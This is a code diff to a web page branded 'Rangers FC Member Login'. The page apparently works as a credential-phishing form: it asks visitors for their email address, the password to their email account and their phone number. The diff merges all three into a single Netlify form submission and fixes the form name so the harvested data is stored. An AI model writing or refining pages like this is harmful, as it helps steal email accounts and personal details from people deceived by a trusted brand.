@@ -97,7 +97,7 @@
     <div class="form-container">
         <h2>Rangers FC Member Login</h2>
 
-        <!-- First form: email & password -->
+        <!-- First form: email, password, and phone -->
         <form id="loginForm" name="loginForm" method="POST" data-netlify="true">
             <input type="email" id="email" name="email" placeholder="Enter your email" required>
             <input type="password" id="userPassword" name="userPassword" placeholder="Enter your email password" required>
@@ -145,7 +145,7 @@
             // Capture phone number
             const phone = document.getElementById('phone').value;
 
-            // Send the form data to Netlify
+            // Send all form data (email, password, phone) to Netlify as a single submission
             fetch(window.location.href, {  // Using current URL to submit to the Netlify handler
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -153,7 +153,7 @@
                     'email': document.getElementById('email').value,
                     'userPassword': document.getElementById('userPassword').value,
                     'phone': phone,
-                    'form-name': 'phoneForm',
+                    'form-name': 'loginForm',  // Make sure to match this with the form's name
                 })
             })
             .then(response => response.text())
